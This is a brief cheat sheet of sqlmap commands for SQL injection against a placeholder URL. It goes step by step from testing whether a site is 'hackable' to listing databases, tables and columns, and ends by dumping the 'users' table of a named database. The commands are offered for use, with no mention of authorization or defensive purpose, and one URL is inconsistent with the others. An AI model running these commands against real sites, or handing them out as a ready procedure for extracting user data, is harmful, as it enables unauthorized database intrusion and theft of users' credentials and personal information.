## Sqlmap Commands

#### #Find if Site is Hackable
$ python sqlmap.py -u "http://www.site.com/section.php?id=51"

#### #Discover Databases
$ python sqlmap.py -u "http://www.sitemap.com/section.php?id=51" --dbs

#### #Find tables in a particular database
$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --tables -D safecosmetics

#### #Get columns of a table
$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics -T users

#### #Get data from a table
$ python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D safecosmetics -T users
